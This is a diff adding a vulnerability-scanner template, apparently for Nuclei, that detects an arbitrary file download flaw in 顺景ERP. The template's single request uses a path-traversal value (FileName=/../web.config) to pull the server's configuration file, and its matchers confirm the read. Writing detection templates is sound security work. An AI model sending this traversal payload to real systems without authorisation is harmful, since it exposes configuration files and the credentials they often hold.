@@ -1,0 +1,28 @@
+id: centersoft-downloadgetfile-anyfile-download
+info:
+  name: 顺景ERP DownloadGetFile 任意文件下载漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "/api/Download/GetFile?FileName=/../web.config&Title="
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<configuration>"
+          - "system.web"
+      - type: word
+        part: header
+        words:
+          - "application/octet-stream"
+      - type: regex
+        part: header
+        regex:
+          - "filename=.*\\.config"
